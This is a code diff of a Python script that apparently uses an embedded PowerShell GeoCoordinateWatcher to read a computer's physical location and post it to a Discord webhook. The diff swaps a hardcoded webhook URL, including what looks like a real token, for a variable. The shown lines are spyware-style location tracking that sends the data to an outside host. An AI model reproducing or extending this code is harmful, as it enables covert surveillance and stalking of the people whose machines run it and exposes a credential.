@@ -1,7 +1,6 @@
 import subprocess
 import requests
 import json
-h00k = "https://discord.com/api/webhooks/1288622525772861450/BlAO7PvOQEbmqvSpqFG_LJMSLW1JOmrNVNHO9QlQeyAgC1pQH0HpHGMAQMZeC-HEP8bG"
 powershell_script = """
 Add-Type -AssemblyName System.Device
 $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
@@ -75,7 +74,7 @@ else:
     }
 
     try:
-        response = requests.post(h00k, headers=headers, data=json.dumps(message))
+        response = requests.post(webhook_url, headers=headers, data=json.dumps(message))
         if response.status_code == 204:
             print("Location information sent to Discord webhook successfully.")
         else:
